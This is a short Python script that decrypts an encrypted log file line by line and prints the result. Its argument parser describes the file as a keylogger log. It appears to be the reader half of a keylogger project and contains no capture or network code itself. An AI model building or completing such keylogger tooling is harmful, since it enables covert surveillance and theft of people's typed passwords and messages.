import argparse
from utils import load_key, decrypt_data

def decrypt_log_file(log_file):
    """
    Decrypt the contents of the log file.
    """
    key = load_key()
    with open(log_file, "rb") as file:
        encrypted_data = file.readlines()

    decrypted_data = [decrypt_data(line.strip(), key) for line in encrypted_data]
    return decrypted_data

def main():
    parser = argparse.ArgumentParser(description="Decrypt keylogger log file")
    parser.add_argument("--log-file", default="log.txt", help="Path to the encrypted log file")
    args = parser.parse_args()

    decrypted_data = decrypt_log_file(args.log_file)
    for line in decrypted_data:
        print(line)

if __name__ == "__main__":
    main()
